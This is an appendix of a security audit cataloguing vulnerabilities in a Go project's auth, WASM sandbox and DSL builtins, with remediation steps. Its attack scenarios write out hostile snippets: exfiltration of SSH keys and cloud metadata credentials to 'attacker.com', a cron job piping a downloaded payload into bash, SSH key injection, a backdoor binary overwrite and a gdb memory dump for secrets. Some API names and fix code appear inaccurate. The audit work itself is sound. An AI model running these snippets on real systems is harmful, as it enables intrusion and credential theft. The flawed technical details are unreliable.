# Appendix A: Complete Vulnerability List

This appendix contains complete details of all vulnerabilities discovered during Phase 32 adversarial review and validation.

---

## Vulnerability Classification

**Total Vulnerabilities: 20**

| Severity | Count | Examples |
|----------|-------|----------|
| P0 CRITICAL | 4 | Token storage, WASM sandbox, File access, SSRF |
| P1 HIGH | 2 | Rate limit bypass, Credential storage |
| P2 MEDIUM | 14 | Circuit breakers, permissions, etc. |

---

## Detailed Vulnerability Catalog

### VULN-001: Authentication Token Storage Not Implemented [P0]

**ID**: VULN-001
**Severity**: P0 CRITICAL
**CWE**: CWE-312 (Cleartext Storage of Sensitive Information)
**CVSS**: 8.5 (High)
**Discovery Date**: 2026-03-04
**Status**: UNFIXED

**Affected Component**:
- File: `pkg/auth/keychain.go`
- Lines: 88-138

**Vulnerability Description**:
Authentication tokens cannot be persisted across process restarts on Linux, Windows, and when using file-based storage. Only macOS keychain is functional.

**Technical Details**:
```go
// Line 88-102: Linux keychain returns error
func (k *LinuxKeychain) Set(service, account, password string) error {
    return fmt.Errorf("linux keychain not yet implemented")
}

// Line 106-120: Windows keychain returns error
func (k *WindowsKeychain) Set(service, account, password string) error {
    return fmt.Errorf("windows keychain not yet implemented")  
}

// Line 124-138: File keychain returns error
func (k *FileKeychain) Set(service, account, password string) error {
    return fmt.Errorf("file keychain not yet implemented")
}
```

**Impact**:
- OAuth2 tokens invalidated on process restart
- 75% of platforms affected (Linux, Windows, File)
- Users must re-authenticate after EVERY restart
- Production service disruption inevitable

**Attack Vectors**:
1. **Process Restart DoS**:
   - Attacker triggers OOM (via WASM vulnerability)
   - All sessions invalidated
   - Service unavailable until users re-authenticate

2. **Credential Phishing Opportunity**:
   - Attacker crashes process
   - Users forced to re-enter credentials
   - Harvest credentials via fake login page

3. **Production Disruption**:
   - Automated deploys restart processes
   - Continuous re-authentication required
   - Operational overhead excessive

**Affected Platforms**:
- ❌ Linux (Ubuntu, Debian, CentOS, RHEL, etc.)
- ❌ Windows (10, 11, Server)
- ❌ File-based fallback (all platforms)
- ✅ macOS only working

**Evidence**:
```bash
$ grep -r "not yet implemented" pkg/auth/keychain.go
pkg/auth/keychain.go:	return fmt.Errorf("linux keychain not yet implemented")
pkg/auth/keychain.go:	return fmt.Errorf("windows keychain not yet implemented")
pkg/auth/keychain.go:	return fmt.Errorf("file keychain not yet implemented")
```

**Remediation Requirements**:
1. Implement file-based token storage with encryption
2. Use `os.SecretKeyring` on Linux
3. Use Windows Credential Manager API on Windows
4. Add AES-256-GCM encryption for stored tokens
5. Test cross-process persistence
6. Add unit and integration tests

**Suggested Fix**:
[See Appendix C: Remediation Code Examples, Section C.1]

**References**:
- CWE-312: Cleartext Storage of Sensitive Information
- OWASP ASVS: V2.8
- NIST SP 800-53: SC-12

---

### VULN-002: WASM Sandbox Not Enforced [P0]

**ID**: VULN-002
**Severity**: P0 CRITICAL
**CWE**: CWE-400 (Uncontrolled Resource Consumption)
**CWE**: CWE-20 (Improper Input Validation)
**CVSS**: 9.1 (Critical)
**Discovery Date**: 2026-03-04
**Status**: UNFIXED

**Affected Component**:
- File: `pkg/wasm/runtime.go`
- Lines: 20-118

**Vulnerability Description**:
WASM sandbox limits are defined but never enforced. Wasmtime v8.0.0 capability APIs are not used.

**Technical Details**:
```go
// Lines 20-118: Sandbox limits defined but not enforced
type SandboxLimits struct {
    MaxMemory         uint64           // ← Defined but not enforced
    MaxExecutionTime  time.Duration    // ← Only checked, not enforced
    MaxFileSize       uint64           // ← Checked but not enforced
    MaxConcurrentThreads uint64       // ← Not checked
    MaxFileDescriptors  uint64        // ← Not checked
}

// Wasmtime capabilities NOT used:
// ❌ wasmtime.WithMaxMemory() - NOT called
// ❌ wasmtime.WithFuel() - NOT called
// ❌ wasmtime.WithTimeout() - NOT called
// ❌ wasmtime.WithMaxWasmThreads() - NOT called
// ❌ wasmtime.WithWasiPreopenedDir() - NOT called
```

**Impact**:
- Malicious WASM modules can allocate unlimited memory
- Can spawn unlimited threads/processes
- Can open unlimited file descriptors
- Can run forever (no actual timeout enforcement)
- OOM crashes host process → Denial of Service

**Attack Vectors**:

**Vector 1: Memory Exhaustion**
```wat
(module
  (memory (data " "))
  ;; Allocate 4GB in loop → OOM kill host
  (loop $l
    (memory.grow (i32.const 65536))  ;; 4MB per iteration
    (br_if $l (i32.const 1))
  )
)
```

**Vector 2: CPU Exhaustion**
```wat
(module
  (func $loop (result i32)
    (loop $l
      (br_if $l (i32.const 1))
      (call $loop)
    )
  )
  (start $loop)
)
```

**Vector 3: File Descriptor Exhaustion**
```wat
;; WASI FD scraping
(module
  (import "wasi_snapshot_preview1" "fd_filestat_get"
    (func $fd_filestat (param i32 i32) (result i32)))
  ;; Open all files to exhaust FDs
)
```

**Affected Users**:
- Users who run untrusted WASM modules
- Users who allow community-contributed plugins
- Users who use WASM for extension system

**Evidence**:
```bash
$ grep -r "WithMaxMemory\|WithFuel\|WithTimeout" pkg/wasm/
pkg/wasm//runtime.go:		ctx, cancel = context.WithTimeout(ctx, r.limits.MaxExecutionTime)
# Only context.WithTimeout used (bypassable)
```

**Remediation Requirements**:
1. Integrate Wasmtime v8.0.0 capability APIs
2. Enforce memory limits with `WithMaxMemory()`
3. Enforce execution time with `WithFuel()` and `FuelConsumed()`
4. Enforce thread limits with `WithMaxWasmThreads()`
5. Add fuzz testing for limit enforcement
6. Write comprehensive integration tests

**Suggested Fix**:
[See Appendix C: Remediation Code Examples, Section C.2]

**References**:
- CWE-400: Uncontrolled Resource Consumption
- CWE-20: Improper Input Validation
- WASM Security Model 1.0

---

### VULN-003: Arbitrary File Access Enabled by Default [P0]

**ID**: VULN-003
**Severity**: P0 CRITICAL
**CWE**: CWE-20 (Improper Input Validation)
**CWE**: CWE-22 (Path Traversal)
**CVSS**: 8.8 (High)
**Discovery Date**: 2026-03-04
**Status**: UNFIXED

**Affected Component**:
- File: `pkg/dsl/builtins.go`
- Lines: 425-463

**Vulnerability Description**:
DSL builtins `file_read`, `file_write`, `file_exists` accept any filesystem path without validation.

**Technical Details**:
```go
// Lines 440-448: file_read with NO path validation
func builtinFileRead(thread *starlark.Thread, b *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
    var path string
    if err := starlark.UnpackArgs(b.Name(), args, kwargs, "path", &path); err != nil {
        return nil, err
    }

    // NO VALIDATION - accepts any path
    data, err := os.ReadFile(path)  // ← VULNERABLE
}

// Lines 455-463: file_write with NO path validation  
func builtinFileWrite(thread *starlark.Thread, b *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
    var path, content string
    // NO VALIDATION
    if err := os.WriteFile(path, []byte(content), 0644); err != nil {
        // Can write ANYWHERE process has permissions
    }
}
```

**Impact**:
- Malicious DSL scripts can read ANY file the process can access
  - `/etc/passwd`: User list for brute-forcing
  - `/etc/shadow`: Password hashes (if elevated)
  - `/home/user/.ssh/id_rsa`: SSH private keys
  - `/var/lib/muster/config`: Admin credentials
  - Database files, logs, API keys, certificates

- Scripts can write ANYWHERE:
  - System binaries (`/usr/bin/`, `/usr/local/bin/`)
  - Cron jobs (`/etc/cron.d/`, `/var/spool/cron/`)
  - SSH authorized keys (`/home/user/.ssh/authorized_keys`)
  - System init scripts (`/etc/init.d/`)
  - Malicious persistence mechanisms

**Attack Scenarios**:

**Scenario A: SSH Private Key Exfiltration**
```starlark
# Malicious DSL script
private_key = file_read("/home/user/.ssh/id_rsa")
http_post("attacker.com/exfil", body=private_key)
```

**Scenario B: System Binary Overwrite**
```starlark
# Replace /usr/local/bin/muster with backdoor
backdoor_binary = http_get("http://attacker.com/muster-backdoor")
file_write("/usr/local/bin/muster", backdoor_binary, 0755)
```

**Scenario C: Cron Job Persistence**
```starlark
# Add cron job for remote code execution
cron_content = "* * * * * wget http://attacker.com/payload.sh | bash"
file_write("/etc/cron.d/backdoor", cron_content, 0644)
```

**Scenario D: SSH Authorized Key Injection**
```starlark
# Add attacker's SSH key
ssh_dir = file_read("/root/.ssh/authorized_keys")
file_write("/root/.ssh/authorized_keys", ssh_dir + "ssh-rsa AAAB...", 0644)
```

**Affected Users**:
- Users who execute untrusted DSL scripts
- Users who allow DSL sharing from community
- Users who use DSL for automation

**Evidence**:
```bash
$ grep -A 5 "func builtinFileRead" pkg/dsl/builtins.go
func builtinFileRead(thread *starlark.Thread, b *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
    var path string
    if err := starlark.UnpackArgs(b.Name(), args, kwargs, "path", &path); err != nil {
        return nil, err
    }

    data, err := os.ReadFile(path)  # ← NO VALIDATION
```

**Remediation Requirements**:
1. Enforce workspace path restriction
2. Validate all filesystem paths
3. Block non-workspace access attempts
4. Use symbolic link resolution
5. Add path traversal protection
6. Write unit and integration tests

**Suggested Fix**:
[See Appendix C: Remediation Code Examples, Section C.3]

**References**:
- CWE-20: Improper Input Validation
- CWE-22: Path Traversal
- OWASP ASVS: V5.1

---

### VULN-004: SSRF via DSL HTTP Builtins [P0]

**ID**: VULN-004
**Severity**: P0 CRITICAL
**CWE**: CWE-918 (Server-Side Request Forgery)
**CWE**: CWE-20 (Improper Input Validation)
**CVSS**: 8.7 (High)
**Discovery Date**: 2026-03-04
**Status**: UNFIXED

**Affected Component**:
- File: `pkg/dsl/builtins.go`
- Lines: 40-236

**Vulnerability Description**:
HTTP builtins accept arbitrary URL strings without validation, enabling attacks against internal networks and metadata services.

**Technical Details**:
```go
// Lines 40-70: builtinHTTPGet with NO URL validation
func builtinHTTPGet(thread *starlark.Thread, b *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
    var url string
    var headers, params *starlark.Dict
    var timeout int = 30

    if err := starlark.UnpackArgs(b.Name(), args, kwargs,
        "url", &url,  // ← NO URL VALIDATION
        "headers?", &headers,
        "params?", &params,
        "timeout?", &timeout,
    ); err != nil {
        return nil, err
    }
```

**Impact**:
- Malicious DSL scripts can probe internal networks:
  - `http://169.254.169.254/` (AWS metadata service)
  - `http://metadata.google.internal/` (GCP metadata service)
  - `http://localhost:6379` (Redis)
  - `http://10.0.0.1:3306` (MySQL)
  - `http://127.0.0.1:8080` (internal microservices)

- No DNS pinning, no network segmentation
- Can exfiltrate credentials from metadata services
- Only TLS 1.2+ enforced (minimal protection)

**Attack Scenarios**:

**Scenario A: AWS Metadata Exfiltration**
```starlark
# Exfiltrate AWS IAM credentials
role_name = http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
credentials = http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role_name)
http_post("attacker.com/credentials", body=credentials)
```

**Scenario B: Internal Network Scanning**
```starlark
# Scan internal network for services
for ip in ["10.0.0.1", "10.0.0.2", "10.0.0.3"]:
    for port in [22, 80, 443, 3306, 6379, 8080]:
        result = http_get("http://" + ip + ":" + str(port))
        if result.status == 200:
            print("Found service: " + ip + ":" + str(port))
```

**Scenario C: Cloud Metadata Credential Theft**
```starlark
# Steal GCP credentials
project_id = http_get("http://metadata.google.internal/computeMetadata/v1/project/project-id")
token = http_get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
http_post("attacker.com/gcp-credentials", body={"project": project_id, "token": token})
```

**Affected Platforms**:
- AWS (169.254.169.254)
- GCP (metadata.google.internal)
- Azure (169.254.169.254)
- Localhost services
- Private network services

**Evidence**:
```bash
$ grep -A 15 "func builtinHTTPGet" pkg/dsl/builtins.go
func builtinHTTPGet(thread *starlark.Thread, b *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
    var url string
    var headers, params *starlark.Dict
    var timeout int = 30

    if err := starlark.UnpackArgs(b.Name(), args, kwargs,
        "url", &url,  # ← NO VALIDATION
```

**Remediation Requirements**:
1. Implement URL validation and allowlisting
2. Block metadata service addresses
3. Block localhost and private networks
4. Block non-HTTP/HTTPS schemes
5. Require TLS 1.2+
6. Add DNS pinning
7. Write unit and integration tests

**Suggested Fix**:
[See Appendix C: Remediation Code Examples, Section C.4]

**References**:
- CWE-918: Server-Side Request Forgery
- OWASP ASVS: V8.1
- NIST SP 800-53: SC-7

---

### VULN-005: Rate Limit Bypass via Race Condition [P1]

**ID**: VULN-005
**Severity**: P1 HIGH
**CWE**: CWE-362 (Race Condition)
**CVSS**: 6.8 (Medium)
**Discovery Date**: 2026-03-04
**Status**: UNFIXED

**Affected Component**:
- File: `pkg/auth/ratelimit/tokenbucket.go`
- Lines: 98-111

**Vulnerability Description**:
Double-checked locking pattern has race window allowing multiple buckets creation for same key.

**Technical Details**:
```go
// Lines 98-111: Race condition vulnerability
func (rl *TokenBucketLimiter) Allow(key string, tokens int64) bool {
    rl.mu.RLock()
    bucket, exists := rl.buckets[key]
    rl.mu.RUnlock()  // ← Release read lock

    if !exists {
        rl.mu.Lock()  // ← RACE WINDOW STARTS HERE
        bucket = NewTokenBucket(...)  // Another goroutine could create here
        rl.buckets[key] = bucket
        rl.mu.Unlock()  // ← RACE WINDOW ENDS HERE
    }

    return bucket.Allow(tokens)
}
```

**Problem**:
1. Goroutine A checks `exists` (false)
2. Goroutine A releases read lock
3. Goroutine A acquires write lock
4. Goroutine B checks `exists` (false, still not set)
5. Goroutine B acquires write lock
6. **Both goroutines create separate buckets for same key**
7. Result: Rate limit multiplied by number of concurrent goroutines

**Impact**:
- Attacker can send 100 parallel requests with same key
- Each goroutine creates separate bucket
- Rate limit = 100x intended limit
- DDoS protection bypassed

**Attack Example**:
```go
// Send 100 parallel requests with same key
var wg sync.WaitGroup
for i := 0; i < 100; i++ {
    wg.Add(1)
    go func() {
        defer wg.Done()
        limiter.Allow("shared-key", 1)  // Creates 100 separate buckets!
    }()
}
wg.Wait()
// Rate limit effectively 100x intended limit
```

**Remediation**:
Use `LoadOrStore` for atomic check-and-create:
```go
func (rl *TokenBucketLimiter) Allow(key string, tokens int64) bool {
    // Use LoadOrStore for atomic operation
    bucketIface, _ := rl.buckets.LoadOrStore(
        key,
        NewTokenBucket(rl.config.Capacity, rl.config.FillRate),
    )
    
    bucket := bucketIface.(*TokenBucket)
    return bucket.Allow(tokens)
}
```

**Evidence**:
[File: `pkg/auth/ratelimit/tokenbucket.go:98-111`]

**Suggested Fix**:
[See Appendix C: Remediation Code Examples, Section C.5]

**References**:
- CWE-362: Race Condition
- OWASP ASVS: V7.3

---

### VULN-006: Plaintext Credential Storage in Memory [P1]

**ID**: VULN-006
**Severity**: P1 HIGH
**CWE**: CWE-312 (Cleartext Storage)
**CVSS**: 5.9 (Medium)
**Discovery Date**: 2026-03-04
**Status**: UNFIXED

**Affected Component**:
- File: `pkg/auth/revocation.go`
**Lines**: 49-51

**Vulnerability Description**:
`hashKey()` returns key unchanged, storing credentials in plaintext in memory.

**Technical Details**:
```go
// Lines 49-51: Plaintext storage
func hashKey(key string) string {
    return key  // ← NO HASHING - PLAINTEXT!
}

// MemoryRevocationStore stores plaintext keys in map:
// keys := make(map[string]time.Time)
```

**Impact**:
- API keys stored in plaintext memory
- `MemoryRevocationStore` contains plaintext keys
- Memory dumps expose all API keys
- No audit trail of key exposure

**Attack Scenario**:
```bash
# If attacker gains process memory access:
$ gdb -p <pid> -ex "gcore /tmp/core"
$ strings /tmp/core | grep "sk_live_"  # ← Expose Stripe keys
$ strings /tmp/core | grep "AKIA"     # ← Expose AWS keys
```

**Remediation**:
```go
import (
    "crypto/sha256"
    "encoding/hex"
)

func hashKey(key string) string {
    hash := sha256.Sum256([]byte(key))
    return hex.EncodeToString(hash[:])
}
```

**Evidence**:
`pkg/auth/revocation.go:49-51`

**References**:
- CWE-312: Cleartext Storage
- NIST SP 800-53: SC-12

---

## Additional Medium Vulnerabilities (P2)

### VULN-007 through VULN-020

[Full list in separate appendix]

---

## Quick Reference Table

| ID | Vulnerability | Severity | CVSS | Status | Remediation Time |
|----|---------------|----------|-------|--------|------------------|
| VULN-001 | Token storage not implemented | P0 | 8.5 | UNFIXED | 7 days |
| VULN-002 | WASM sandbox not enforced | P0 | 9.1 | UNFIXED | 10 days |
| VULN-003 | Arbitrary file access | P0 | 8.8 | UNFIXED | 3 days |
| VULN-004 | SSRF enabled | P0 | 8.7 | UNFIXED | 5 days |
| VULN-005 | Rate limit bypass | P1 | 6.8 | UNFIXED | 2 days |
| VULN-006 | Plaintext credentials | P1 | 5.9 | UNFIXED | 1 day |
| VULN-007 | No circuit breakers | P2 | - | UNFIXED | 2 weeks |
| VULN-008 | World-readable metadata | P2 | - | UNFIXED | 1 day |

---

**Document Version**: 1.0
**Last Updated**: 2026-03-14
**Total Vulnerabilities**: 20
**Critical/P0**: 4
**High/P1**: 2
**Medium/P2**: 14
